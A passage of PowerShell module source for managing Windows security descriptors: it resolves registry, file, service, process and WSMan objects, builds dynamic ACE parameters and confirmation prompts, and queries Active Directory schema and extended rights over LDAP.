                    # GetNamedSecurityInfo API function needs registry hive in a different format
                    # than PS uses (http://msdn.microsoft.com/en-us/library/windows/desktop/aa379593%28v=vs.85%29.aspx)
                    if ($Object.Name -notmatch "^(?<hive>[^\\]+)\\(?<path>.*)$") {
                        throw ("Uknown registry path: {0}" -f $Object.Name)
                    }
                    $Hive = $matches.hive -replace "^HKEY_(LOCAL_)?", ""
                    $RegPath = $matches.path

                    # Valid hives: CLASSES_ROOT, CURRENT_USER, MACHINE, USERS
                    if (-not ("CURRENT_USER","MACHINE" -contains $Hive)) {
                        throw ("Unknown registry hive: $Hive")
                    }

                    # SdPath can start with \\<machinename> for remote machines (maybe in the future)
                    $OutputProperties.SdPath = "$Hive\{0}" -f $RegPath  # Path may contain {}
                    $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::RegistryKey
                    $OutputProperties.Path = $Object.PsPath
                    $OutputProperties.DisplayName = $Object.ToString()
                }

                { "System.IO.DirectoryInfo",
                  "System.IO.FileInfo" -contains $_ } {
                    $OutputProperties.SdPath = $OutputProperties.Path = $Object.FullName
                    $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::FileObject
                }
                
                "Microsoft.WSMan.Management.WSManConfigLeafElement" {

                    # Still figuring out how to handle WSMan better, but for now, leaf elements with
                    # an SDDL property will work

                    if ($Object.Name -ne "SDDL") {
                        Write-Error ("'{0}' does not contain a security resource" -f $Object.PsPath)
                        return
                    }

                    $OutputProperties.SdPath = $OutputProperties.Path = $Object.PsPath
                    $OutputProperties.ObjectType = $__PowerShellAccessControlResourceTypeName
                    $OutputProperties.AccessMaskEnum = [PowerShellAccessControl.WsManAccessRights]
                }

                "System.ServiceProcess.ServiceController" {
                    $OutputProperties.SdPath = "\\{0}\{1}" -f $Object.MachineName, $Object.ServiceName
                    $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::Service
                    $OutputProperties.DisplayName = "Service: {0}" -f $Object.DisplayName
                    $OutputProperties.Path = "Service: {0}" -f $OutputProperties.SdPath
                }

                "System.Diagnostics.Process" {
                    $OutputProperties.DisplayName = $OutputProperties.Path = "Process: {0} (PID {1})" -f $Object.Name, $Object.Id
                    
                    if (-not $Object.Handle) {
                        Write-Error ("Can't access process handle for {0}" -f $OutputProperties.DisplayName)
                        return
                    }

                    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef ($Object, $Object.Handle)
                    $OutputProperties.Handle = $HandleRef
                    $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::KernelObject
                    $OutputProperties.AccessMaskEnum = [PowerShellAccessControl.ProcessAccessRights]
                }


                default {
                    <#
                        An unsupported object was presented. We can just end it here, or we can see if the object has a
                        .Path property (could even check for a LiteralPath property). This might be a bad idea, but we're
                        going to check it for a path property, and if it has one, we're going to return information as
                        if that's what was called (param binder won't bind the path property if an object was piped into
                        this function, or if the -InputObject was called)
                    #>

                    Write-Debug "$($MyInvocation.MyCommand): Unknown object. Checking for path property or string value..."
                    if ($Object.Path -ne $null) {
                        try {
                            GetPathInformation -Path $Object.Path -ErrorAction Stop
                        }
                        catch {
                            Write-Error $_
                        }
                    }
                    elseif ($Object.GetType().FullName -eq "System.String") {
                        try {
                            GetPathInformation -Path $Object
                        }
                        catch {
                            Write-Error $_
                        }
                    }
                    else {
                        Write-Error ("{0} type not supported!" -f $_)
                    }

                    return
                }
            }

            if (-not $OutputProperties.ContainsKey("DisplayName")) {
                $OutputProperties.DisplayName = $OutputProperties.Path
            }

            # Add AccessMask enumerations based on object type (this may have been done earlier when detecting
            # what type of object was sent. WMI namespaces and WSMAN nodes share the same ObjectType, so they
            # were defined earlier. Processes aren't the only kernel objects that could potentially be handled,
            # so those are taken care of above, too
            if ($OutputProperties.AccessMaskEnum -eq $null) {
                switch ($OutputProperties.ObjectType.ToString()) {
                    "FileObject" {
                        $OutputProperties.AccessMaskEnum = [System.Security.AccessControl.FileSystemRights]
                    }
                    "Service" {
                        $OutputProperties.AccessMaskEnum = [PowerShellAccessControl.ServiceAccessRights]
                        $OutputProperties.IsContainer = $false # Service objects aren't containers (at least I don't think they are)
                    }
                    "Printer" {
                        $OutputProperties.AccessMaskEnum = [PowerShellAccessControl.PrinterRights]
                        $OutputProperties.IsContainer = $true # The GUI appears to allow container inherit/propagation flags
                    }
                    { $_ -eq "RegistryKey" -or $_ -eq "RegistryWow6432Key" } {
                        $OutputProperties.AccessMaskEnum = [System.Security.AccessControl.RegistryRights]
                        $OutputProperties.IsContainer = $true # Registry keys are containers
                    }
                    "LMShare" {
                        $OutputProperties.AccessMaskEnum = [PowerShellAccessControl.LogicalShareRights]
                        $OutputProperties.IsContainer = $false # I don't think logical shares are containers
                    }
                    { $_ -like "DSObject*" } {
                        $OutputProperties.AccessMaskEnum = [PowerShellAccessControl.ActiveDirectoryRights]
                        $OutputProperties.IsContainer = $true  # Is this always the case??
                        $OutputProperties.IsDsObject = $true
                    }
                }
            }

            # If the IsContainer property hasn't been defined by this point, it will be $false b/c of default value

            if ($OutputProperties.ObjectType -like "DsObject*" -and $OutputProperties.DsObjectClass -eq $null) {
                # If this is for an AD object, and the ActiveDirectory module didn't provide the output, we need
                # to look up the object class (that's needed to help with the AppliesTo for InheritedObjectAceTypes)
                try {
                    $OutputProperties.DsObjectClass = ([adsi] ("LDAP://{0}" -f $OutputProperties.SdPath)).Properties.ObjectClass | select -last 1
                }
                catch {
                    Write-Warning ("Unable to determine object class for '{0}'" -f $OutputProperties.SdPath)
                    $OutputProperties.DsObjectClass = "Unknown"
                }
            }

            if ($OutputProperties.DsObjectClass) {
                $OutputProperties.DisplayName = "{0} ({1})" -f $OutputProperties.DisplayName, ($OutputProperties.DsObjectClass -join ", ")
            }

            # Return a hash table that can be splatted to other functions...
            $OutputProperties

        } # end foreach $Object in $InputObject
    }
}

function script:GetNewAceParams {
  <#
      The *-AccessControlEntry functions all share parameters with New-AccessControlEntry. In early versions of the module, I
      knew that new parameters could/would be added, so I didn't want to explicitly define them on all of the functions (I'd
      have to change every function each time a parameter change was made). For that reason, I use dynamic params on the other
      functions. Some of the functions require changes to the Parameter() attributes, so the switches to this function can
      handle that.

      I may end up explicitly defining each of the param blocks now that the module has (hopefully) matured enough to where
      constant parameter changes aren't necessary.
  #>
    [CmdletBinding()]
    param(
        # This can actually be used for other function/cmdlet parameters
        [Parameter(ValueFromPipeline=$true)]
        $ParameterDictionary = (Get-Command New-AccessControlEntry -ArgumentList @("SystemAudit") | select -exp Parameters),
        # Used for Add-AccessControlEntry and Remove-AccessControlEntry (when looking for an exact ACE match)
        [switch] $ReplaceAllParameterSets,
        # Used for Get-AccessControlEntry and Remove-AccessControlEntry (when looking for loose ACE matching)
        [switch] $RemoveMandatoryAttribute,
        [switch] $ConvertTypesToArrays,
        [switch] $AllowAliases,
        [switch] $AllowPositionAttributes
    )

    begin {
        $__CommonParameterNames = [System.Runtime.Serialization.FormatterServices]::GetUninitializedObject([type] [System.Management.Automation.Internal.CommonParameters]) | 
            Get-Member -MemberType Properties | 
            Select-Object -ExpandProperty Name

        # We're going to make copies of param attributes later. You basically have to create a blank attrib,
        # then change the properties. Knowing the writable ones will be very useful:
        $__WritableParamAttributePropertyNames = New-Object System.Management.Automation.ParameterAttribute | 
            Get-Member -MemberType Property | 
            Where-Object { $_.Definition -match "{.*set;.*}$" } | 
            Select-Object -ExpandProperty Name

        if (-not $AllowPositionAttributes) {
            # For the purposes of this module, we want to strip away any positional parameters from dynamic params:
            $__WritableParamAttributePropertyNames = $__WritableParamAttributePropertyNames | where { $_ -ne "Position" }
        }

    }

    process {

        # Convert to object array and get rid of Common params:
        $Parameters = $ParameterDictionary.GetEnumerator() | Where-Object { $__CommonParameterNames -notcontains $_.Key }

        if ($ReplaceAllParameterSets) {
            # Get all parameter set names (we need to take any params that are in the __AllParameterSets from New-AccessControlEntry
            # and manually add them to all available paramsets so that the __AllParameterSets on the function with these dynamic params
            # won't have those params in the __AllParameterSets set):
            $__NewAceParameterSetNames = foreach ($Parameter in $Parameters) {
                # PSv3 would make this sooooo much easier! We're unpacking all of the parameter set names from ParameterAttribute
                # attributes:
                foreach ($ParamAttribute in ($Parameter.Value.Attributes | where { $_.TypeId.Name -eq "ParameterAttribute" })) {
                    $ParamAttribute.ParameterSetName
                }
            }

            # We're only interested in unique names, and we don't care about the __AllParameterSets name (it will be replaced
            # on all of the params)
            $__NewAceParameterSetNames = $__NewAceParameterSetNames | 
                where { $_ -ne [System.Management.Automation.ParameterAttribute]::AllParameterSets } | 
                select -Unique
        }


        # Create the dictionary that this scriptblock will return:
        $DynParamDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary

        foreach ($Parameter in $Parameters) {

            $AttribColl = New-Object System.Collections.ObjectModel.Collection[System.Attribute]

            $Parameter.Value.Attributes | ForEach-Object {
                $CurrentAttribute = $_
                $AttributeTypeName = $_.TypeId.FullName

                switch ($AttributeTypeName) {
                    "System.Management.Automation.ArgumentTypeConverterAttribute" {
            # Ignore this; can't create a new one;
            # does it get auto generated?
                        return  # So blank param doesn't get added
                    }

                    "System.Management.Automation.AliasAttribute" {
            #                        # Create a new alias attribute:
            #                        $NewParamAttribute = New-Object $AttributeTypeName $CurrentAttribute.AliasNames
                        # Since this won't get changed, there shouldn't be problem using the reference to the original
                        if ($AllowAliases) {
                            $AttribColl.Add($CurrentAttribute)
                        }
                    }

                    "System.Management.Automation.ValidateSetAttribute" {
                        # Can't create a new one; will this work?
                        $NewParamAttribute = $CurrentAttribute
                $AttribColl.Add($NewParamAttribute)

                    }

                    "System.Management.Automation.ParameterAttribute" {

                        if ($ReplaceAllParameterSets -and $CurrentAttribute.ParameterSetName -eq [System.Management.Automation.ParameterAttribute]::AllParameterSets) {
                            $ParameterSets = $__NewAceParameterSetNames
                        }
                        else {
                            $ParameterSets = $CurrentAttribute.ParameterSetName
                        }

                        foreach ($ParamSetName in $ParameterSets) {

                            $NewParamAttribute = New-Object System.Management.Automation.ParameterAttribute
                        
                            foreach ($PropName in $__WritableParamAttributePropertyNames) {
                                if ($NewParamAttribute.$PropName -ne $CurrentAttribute.$PropName) {  
                                    # nulls cause an error if you assign them to some of the properties
                                    $NewParamAttribute.$PropName = $CurrentAttribute.$PropName
                                }
                            }

                            if ($RemoveMandatoryAttribute) {
                                $NewParamAttribute.Mandatory = $false
                            }
                            $NewParamAttribute.ParameterSetName = $ParamSetName

                            $AttribColl.Add($NewParamAttribute)
                        }
                    }

                    default {
                        # I think the type converter was what was giving me the problems. This can probably be
                        # where everything except the parameterattribute and the type converter go, and the attribute
                        # can be added to the collection untouched
                        Write-Warning "don't handle dynamic param copying for $AttributeTypeName"
                        return
                    }
                }

            }

            $CurrentType = $Parameter.Value.ParameterType
            $ParameterType = $CurrentType

            if ($ConvertTypesToArrays) {
                # Make sure that the param type is an array:

                if (($CurrentType -ne [switch]) -and (-not $CurrentType.IsArray)) {
                    # Might need to add more types to not attempt this on
                    $NewType = ("{0}[]" -f $CurrentType.FullName) -as [type]

                    if ($NewType) {
                        $ParameterType = $NewType
                    }
                }
            }

            $DynamicParameter = New-Object System.Management.Automation.RuntimeDefinedParameter (
                $Parameter.Key,
                $ParameterType,
                $AttribColl
            )
            $DynParamDictionary.Add($Parameter.Key, $DynamicParameter)
        }

        # Return the dynamic parameters
        $DynParamDictionary

    }

}

function script:GetAceString {
  <#
      -Confirm and -WhatIf params use this to get a friendly description for an ACE.

      This needs to be changed to use New-AdaptedAcl or the function should be removed, and
      any functions that depend on it can use New-AdaptedAcl
  #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        $Ace
    )

    process {
        # Get identity reference:
        $UnknownAccountString = "Unknown Account"
        if ($Ace.IdentityReference -ne $null) {
            $IdentityReference = $Ace.IdentityReference
        }
        elseif ($Ace.SecurityIdentifier -ne $null) {
            $IdentityReference = $Ace.SecurityIdentifier
        }
        else {
            $IdentityReference = $UnknownAccountString
        }

        if ($IdentityReference -is [System.Security.Principal.SecurityIdentifier]) {
            try {
                $IdentityReference = $IdentityReference.Translate([System.Security.Principal.NTAccount])
            }
            catch {
                $IdentityReference = "$UnknownAccountString ($IdentityReference)"
            }
        }

        # Get ACE type:
        if ($Ace.AceType -ne $null) {
            $AceType = $Ace.AceType
        }
        elseif ($Ace.AuditFlags -ne $null) {
            $AceType = [System.Security.AccessControl.AceType]::SystemAudit
        }
        else {
            # Last ditch effort:
            $PropertyName = $Ace | Get-Member -MemberType Property -Name *Type | select -First 1 -ExpandProperty Name
            $AceType = $Ace.$PropertyName
        }

        # Get access mask:
        if ($Ace.AccessMask) {
            $AccessMask = $Ace.AccessMask
        }
        else {
            # Last ditch effort:
            $PropertyName = $Ace | Get-Member -MemberType Property -Name *Rights | select -First 1 -ExpandProperty Name
            $AccessMask = $Ace.$PropertyName
        }

        # Return output:
        "{0} {1} {2}" -f $AceType, $IdentityReference, $AccessMask
    }
}

function script:InvokeCommonAclMethod {
  <#
      Used for RemoveAccessRule, RemoveAccessRuleSpecific, AddAccessRule, AddAuditRule on
      the Get-SD objects.

      No param validation, so make sure the caller knows what's going on.
  #>
    [CmdletBinding()]
    param(
        $Rule,
        $Acl,
        $MethodName
    )

    process {

        if ($Acl -eq $null) {
            return
        }

        if ($Rule.GetType().FullName -ne "System.Security.AccessControl.CommonAce") {
            # We need a CommonAce object for this to work
            try {
                $Rule = $Rule | ConvertToCommonAce -ErrorAction Stop
            }
            catch {
                Write-Error $_
                return
            }
        }

        if ($Rule.AceType -match "AccessAllowed(Object)?") {
            $AceType = [System.Security.AccessControl.AccessControlType]::Allow
        }
        elseif ($Rule.AceType -match "AccessDenied(Object)?") {
            $AceType = [System.Security.AccessControl.AccessControlType]::Deny
        }
        elseif ($Rule.AceType -match "SystemAudit(Object)?") {
            $AceType = $Rule.AuditFlags   # Misnamed, but this will still work
        }
        else {
            Write-Error ("Unknown ACE type: {0}" -f $Rule.AceType)
            return
        }

        # The methods (and their overloads) all have the same
        # first five arguments:
        $Arguments = @(
            $AceType, 
            $Rule.SecurityIdentifier, 
            $Rule.AccessMask, 
            $Rule.InheritanceFlags, 
            $Rule.PropagationFlags
        )

        if ($Rule.AceType -match "Object$") {
            # Methods overloads for object ACEs have extra arguments:
            $Arguments += $Rule.ObjectAceFlags
            $Arguments += $Rule.ObjectAceType
            $Arguments += $Rule.InheritedObjectAceType
        }

        Write-Debug "Invoking $MethodName"
        $Acl.$MethodName.Invoke($Arguments)
    }
}

function script:CustomShouldProcess {
  <#
      Function that attempts to mimic $PsCmdlet.ShouldProcess(). There is a common scenario using this module
      where I haven't figure out a way to get $PsCmdlet.ShouldProcess() to work propertly. Here it is:
      - Set-SecurityDescriptor has a confirm impact of 'High' so that it will always prompt before saving
      a security descriptor (unless, of course, the -Force or -Confirm:$false parameters are passed)
      - Add-Ace, Remove-Ace, Disable/Enable-AclInheritance, Set-Owner, etc, all have an -Apply and -PassThru
      parameter, and they can all take more than one object as input that need an SD modified. Those functions
      have a ConfirmImpact of 'Medium'
      - When you call one of those with more than one object w/o -Force or -Confirm:$false, and the -Apply parameter
      is specified (or implied b/c of input object type), Set-SecurityDescriptor causes a prompt (which is good).
      The problem is that a YesAll or NoAll selection at the prompt will not work (you'll be prompted every time).
      That's annoying when you have ten or so SDs to modify, but it becomes absolutely unworkable when you try to
      do tens or hundreds of SDs. I originally tried to get around this by having all SDs saved until the end {}
      block, but that creates a limit on the number of SDs you can handle (even if it would be very difficult to
      find that limit). Also, a single terminating error would mean that none of the SDs would be applied.

      I'm probably just missing something when it comes to $PsCmdlet.ShouldProcess(), so for now, this function is
      an attempt to handle the issue. I want Set-SecurityDescriptor to prompt, but I don't want the modfication functions
      to prompt (unless they're trying to apply).
  #>
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="Medium")]
    param(
        [Parameter(Mandatory=$true)]
        [string] $Action,
        [Parameter(Mandatory=$true)]
        [string] $Target,
        [Parameter(Mandatory=$true)]
        [ref] $__DefaultReturn,
        [Parameter(Mandatory=$true)]
        [ref] $__CustomConfirmImpact
    )

    $Message = "Performing the operation `"{0}`" on target `"{1}`"." -f $Action, $Target

    if ($WhatIfPreference) {
        Write-Host "What if: $Message"
        return $false
    }
    elseif ($ConfirmPreference -eq "None") {
        # -Confirm was passed with $false
        return $true
    }
    elseif ($__CustomConfirmImpact.Value.value__ -ge $ConfirmPreference) {

        $YesChoice = New-Object System.Management.Automation.Host.ChoiceDescription (
            "&Yes",
            "Continue with only the next step of the operation."
        )
        $YesToAllChoice = New-Object System.Management.Automation.Host.ChoiceDescription (
            "Yes to &All",
            "Continue with all the steps of the operation."
        )
        $NoChoice = New-Object System.Management.Automation.Host.ChoiceDescription (
            "&No",
            "Skip this operation and proceed with the next operation"
        )
        $NoToAllChoice = New-Object System.Management.Automation.Host.ChoiceDescription (
            "No to A&ll",
            "Skip this operation and all subsequent operations."
        )
        $SuspendChoice = New-Object System.Management.Automation.Host.ChoiceDescription (
            "&Suspend",
            'Pause the current pipeline and return to the command prompt. Type "exit" to resume the pipeline'
        )

        $Choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
            $YesChoice, 
            $YesToAllChoice,
            $NoChoice,
            $NoToAllChoice,
            $SuspendChoice
        )

        do {
            $Result = $Host.UI.PromptForChoice("Confirm", "Are you sure you want to perform this action?`n$Message", $Choices, 0) 

            switch ($Result) {
                1 { 
                    # Yes to All 
                    $__CustomConfirmImpact.Value = [System.Management.Automation.ConfirmImpact]::None
                    $__DefaultReturn.Value = $true
                }
                { 0, 1 -contains $_ } { 
                    # One of the Yes answers
                    return $true 
                }
                3 { 
                    # No to All
                    $__CustomConfirmImpact.Value = [System.Management.Automation.ConfirmImpact]::None
                    $__DefaultReturn.Value = $false
                }

                { 2, 3 -contains $_ } {
                    # One of the No ansers
                    return $false
                }
                4 { $Host.EnterNestedPrompt() }
            }
        } while ($Result -ge 4) # Loop until one of the first 4 choices is made
    }
    else {
        return $__DefaultReturn.Value
    }
}

function script:GetSdString {
  <#
      Used to get a ShouldProcess action string of what an SD object contains
  #>
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$true)]
        $SDObject,
        [PowerShellAccessControl.PInvoke.SecurityInformation] $SecurityInformation
    )

    process {
        $OutputString = ""

        if (-not $PSBoundParameters.ContainsKey("SecurityInformation")) {
            # $SecurityInformation wasn't supplied, so assume all SD parts will be listed
            # (If an Audit section isn't present, that will be removed next)
            $SecurityInformation = [PowerShellAccessControl.PInvoke.SecurityInformation]::All

            if ($SDObject.SecurityDescriptor.ControlFlags -and (-not $SDObject.AuditPresent)) {
                # So, if there is a ControlFlags property (there wouldn't be on a Get-Acl object), and a 
                # SACL isn't present, make sure the $SecurityInformation doesn't say to look for it.

                $SecurityInformation = $SecurityInformation -bxor [PowerShellAccessControl.PInvoke.SecurityInformation]::Sacl
            }
        }

        if ($SDObject.DaclProtectionDirty -and ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation] "ProtectedDacl, UnprotectedDacl")) {
            $OutputString += "`n{0}`n" -f $SDObject.DaclProtectionDirty
        }
        if ($SDObject.SaclProtectionDirty -and ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation] "ProtectedSacl, UnprotectedSacl")) {
            $OutputString += "`n{0}`n" -f $SDObject.SaclProtectionDirty
        }

        if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::Owner) {
            $OutputString += "`nOwner: {0}`n" -f $SDObject.Owner
        }
        if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::Group) {
            $OutputString += "`nGroup: {0}`n" -f $SDObject.Group
        }
        if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::ProtectedDacl) {
            $OutputString += "`nDACL Inheritance: Disabled`n"
        }
        if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::UnprotectedDacl) {
            $OutputString += "`nDACL Inheritance: Enabled`n"
        }
        if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::Dacl) {
            $OutputString += "`nDACL{1}:`n{0}`n" -f $SDObject.AccessToString, "$(if ($SDObject.DaclProtectionDirty) { ' (NOT ACCURATE UNTIL DESCRIPTOR APPLIED)' } else { '' })"
        }
        if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::ProtectedSacl) {
            $OutputString += "`nSACL Inheritance: Disabled`n"
        }
        if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::UnprotectedSacl) {
            $OutputString += "`nSACL Inheritance: Enabled`n"
        }
        if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::Sacl) {
            $OutputString += "`nSACL{1}:`n{0}`n" -f $SDObject.AuditToString, "$(if ($SDObject.SaclProtectionDirty) { ' (NOT ACCURATE UNTIL DESCRIPTOR APPLIED)' } else { '' })"
        }

        $OutputString
    }
}

function script:GetSchemaObject {
  <# 
      This uses an ADSI searcher to lookup DS class objects and properties. It's called once to get a list of all
      of them. The function's output is a custom object with the guid, several name properties (the DisplayName
      is what will be used in the hash table used for caching), the PropertySet GUID (if the object is an
      attributeSchema and it belongs to a PropertySet).
  #>
    [CmdletBinding()]
    param(
        [Alias('Class')]
        [ValidateSet("attributeSchema","classSchema")]
        [string[]] $ObjectClass = ("attributeSchema","classSchema"),
        [guid[]] $SchemaIdGuid,
        [string[]] $Name,
        [string[]] $AdminDisplayName,
        [string[]] $LdapDisplayName,
        [Alias('PropertySetGuid')]
        [guid[]] $AttributeSecurityGuid
    )

    Write-Debug "$($MyInvocation.MyCommand): Entering function; searching for $ObjectClass objects"

    $__CommonParameterNames = [System.Runtime.Serialization.FormatterServices]::GetUninitializedObject([type] [System.Management.Automation.Internal.CommonParameters]) | 
        Get-Member -MemberType Properties | 
        Select-Object -ExpandProperty Name

    $Properties = echo Name, ObjectClass, SchemaIdGuid, LdapDisplayName, adminDisplayName, attributeSecurityGUID

    if (-not $PSBoundParameters.ContainsKey("ObjectClass")) {
        # If object class wasn't specified via parameters, add the default value so loop
        # below will add it to the filter
        $PSBoundParameters.Add("ObjectClass", $ObjectClass)
    }

    $FilterConditions = @()

    foreach ($Parameter in $PSBoundParameters.GetEnumerator()) {
        # Ignore common params:
        if ($__CommonParameterNames -contains $Parameter.Key) { continue }
        
        $CurrentSegment = @()
        foreach ($Value in $Parameter.Value) {
            if ($Value -is [guid]) {
                # Guids need to be transformed into ldap filter format
                $Value = -join ($Value.ToByteArray() | foreach { "\{0:x2}" -f $_ })
            }

            $CurrentSegment += "({0}={1})" -f $Parameter.Key, $Value
        }

        if ($CurrentSegment.Count -gt 1) {
            $StringFormat = "(|{0})"
        }
        else {
            $StringFormat = "{0}"
        }

        $FilterConditions += $StringFormat -f (-join $CurrentSegment)
    }

    if ($FilterConditions.Count -gt 1) {
        $StringFormat = "(&{0})"
    }
    else {
        $StringFormat = "{0}"
    }

    $LdapFilter = $StringFormat -f (-join $FilterConditions)

    Write-Debug "$($MyInvocation.MyCommand): LdapFilter = $LdapFilter"

    # Create a DirectorySearcher object:
    $RootDSE = [adsi] "LDAP://RootDSE"
    $SchemaNamingContext = [adsi] ("LDAP://{0}" -f $RootDSE.schemaNamingContext.Value)

    $Searcher = New-Object adsisearcher ($SchemaNamingContext, $LdapFilter, $Properties)
    $Searcher.PageSize = 1000

    $FoundResult = $false
    try {
        foreach ($Result in $Searcher.FindAll()) {
            if ($null -eq $Result) {
                break
            }
            $FoundResult = $true

            $DisplayNameProp = "LdapDisplayName"
            #$DisplayNameProp = "AdminDisplayName"
      <#
          AdminDisplayName is prettier, but LdapDisplayName is required for ObjectClass property off of AD 
          objects to be able to be looked up properly. Possible to make yet another hash table that keeps 
          up with objects whose LdapDisplayName and AdminDisplayName don't match, and that can be checked 
          if necessary...
      #>

            if ($Result.Properties.Item($DisplayNameProp)) {
                $DisplayName = $Result.Properties.Item($DisplayNameProp)[0]
            }
            else {
                $DisplayName = $Result.Properties.Item("Name")[0]
            }

            $Props =  @{
                Name = $Result.Properties.Item("Name")[0]
                SchemaIdGuid = [guid] $Result.Properties.Item("SchemaIdGuid")[0]
                ObjectClass = $Result.Properties.Item("ObjectClass")[$Result.Properties.Item("ObjectClass").Count - 1]
                DisplayName = $DisplayName
                AdminDisplayName = $Result.Properties.Item("AdminDisplayName")[0]
                LdapDisplayName = $Result.Properties.Item("lDAPDisplayName")[0]
            }

            # Property, so it could belong to a propertyset
            if ($Props.ObjectClass -eq "attributeSchema") {
                try {
                    $Props.PropertySet = [guid] $Result.Properties.Item("attributeSecurityGUID")[0]
                }
                catch {
                    # Probably blank, so no propertyset
                }
            }

            New-Object PSObject -Property $Props
        }
        $Searcher.Dispose()
        $SchemaNamingContext.Dispose()
        $RootDSE.Dispose()
    }
    catch {
        throw $_
    }

    if (-not $FoundResult) {
        Write-Error "Couldn't find any schema objects that matched the search criteria"
    }
    Write-Debug "$($MyInvocation.MyCommand): Exiting function"

}

function script:GetExtendedRight {
  <# 
      Like GetSchemaObject, except it looks in the Extended-Rights configuration container. It will find ExtendedRights, ValidatedWrites,
      and PropertySets. Just like that function, custom PSObjects are output, and the function that calls this function will save all objects
      to a hash table for faster lookups
  #>
    [CmdletBinding()]
    param(
        [guid[]] $AppliesTo,
        [guid[]] $RightsGuid,
        [string[]] $Name,
        [string[]] $DisplayName,
        [ValidateSet("Self", "ExtendedRight", "ReadProperty,WriteProperty")]
        [string[]] $ValidAccesses
    )

    Write-Debug "$($MyInvocation.MyCommand): Entering function; searching for $ValidAccesses"

    $__CommonParameterNames = [System.Runtime.Serialization.FormatterServices]::GetUninitializedObject([type] [System.Management.Automation.Internal.CommonParameters]) | 
        Get-Member -MemberType Properties | 
        Select-Object -ExpandProperty Name

    $Properties = echo appliesTo, rightsGuid, DisplayName, validAccesses, Name

    $FilterConditions = @()

    foreach ($Parameter in $PSBoundParameters.GetEnumerator()) {

        if ($__CommonParameterNames -contains $Parameter.Key) { continue }
        $CurrentSegment = @()
        foreach ($Value in $Parameter.Value) {
            if ($Parameter.Key -eq "ValidAccesses") {
                # Valid accesses gets special handling:
                $Value = ([PowerShellAccessControl.ActiveDirectoryRights]$Value).value__
            }
            $CurrentSegment += "({0}={1})" -f $Parameter.Key, $Value
        }

        if ($CurrentSegment.Count -gt 1) {
            $StringFormat = "(|{0})"
        }
        else {
            $StringFormat = "{0}"
        }

        $FilterConditions += $StringFormat -f (-join $CurrentSegment)
    }

    if ($FilterConditions.Count -eq 0) {
        $FilterConditions += "(name=*)"
    }

    if ($FilterConditions.Count -gt 1) {
        $StringFormat = "(&{0})"
    }
    else {
        $StringFormat = "{0}"
    }

    $LdapFilter = $StringFormat -f (-join $FilterConditions)

    Write-Debug "$($MyInvocation.MyCommand): LdapFilter = $LdapFilter"

    # Create a DirectorySearcher object:
    $RootDSE = [adsi] "LDAP://RootDSE"
    $ExtendedRights = [adsi] ("LDAP://CN=Extended-Rights,{0}" -f $RootDSE.ConfigurationNamingContext.Value)
    $Searcher = New-Object adsisearcher ($ExtendedRights, $LdapFilter, $Properties)
    $Searcher.PageSize = 1000

    $FoundResult = $false
    try {
        foreach ($Result in $Searcher.FindAll()) {
            if ($null -eq $Result) {
                break
            }
            $FoundResult = $true

            New-Object PSObject -Property @{
                DisplayName = $Result.Properties.Item("DisplayName")[0]
                Name = $Result.Properties.Item("Name")[0]
                RightsGuid = [guid] $Result.Properties.Item("RightsGuid")[0]
                ValidAccesses = $Result.Properties.Item("ValidAccesses")[0]
                appliesTo = [guid[]] ($Result.Properties.Item("appliesTo") | % { $_ })
            }
        }
        $Searcher.Dispose()
        $ExtendedRights.Dispose()
        $RootDSE.Dispose()
    }
    catch {
        throw $_
    }

    if (-not $FoundResult) {
        Write-Error "Couldn't find any extended rights that matched the search criteria"
    }

    Write-Debug "$($MyInvocation.MyCommand): Exiting function"
}

function script:ConvertGuidToName {
  <#
      Helper function that allows GUID to name translation, and also the ability to list all relevant
      schema objects (ClassObjects, PropertySets, Properties, ValidatedWrites, ExtendedRights).

      Get-ADObjectAce uses the -ListAll in the dynamicparam{} block when one of the switches is used.

      This function is also responsible for populating the hash table(s) used for quick lookup. When the
      function is called, the $Type param is used to determine which hash table(s) is checked. If the
      table has no data, the GetSchemaObject and/or GetExtendedRights functions are called to populate
      it.
  #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ParameterSetName="ListAll")]
        [switch] $ListAll,
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ParameterSetName="Lookup")]
        [guid] $Guid,
        [Parameter(Mandatory=$true)]
        [ValidateSet(
            "ValidatedWrite", 
            "ExtendedRight",
            "Property",
            "PropertySet",
            "ClassObject"
        )]
        [string] $Type,
        # Can be used to limit -ListAll results for extended rights
        [guid[]] $AppliesTo
    )

    begin {
    #        Write-Debug "$($MyInvocation.MyCommand): Entering function; searching for $Type"

        # Grab the proper caching hash table:
        $HashTable = Get-Variable -Scope Script -Name "__Ds$TypeTable" -ValueOnly

        # Check to see if table has been populated. If not, populate it:
        if ($HashTable.Count -eq 0) {
            Write-Debug "$($MyInvocation.MyCommand): Populating $Type table..."
            Write-Progress -Activity "Populating $Type table" -Status "Progress:" -Id 1 -PercentComplete 50

            # Figure out the function and parameters to run:
            $Params = @{}
            switch ($Type) {
                { "ValidatedWrite","ExtendedRight","PropertySet" -contains $_ } {
                    $FunctionName = "GetExtendedRight"
                    $KeyPropertyName = "RightsGuid"
                    if ($PSBoundParameters.ContainsKey("AppliesTo")) {
                        $Params.AppliesTo = $AppliesTo
                    }
                }
                ValidatedWrite {
                    $Params.ValidAccesses = "Self"
                }

                ExtendedRight {
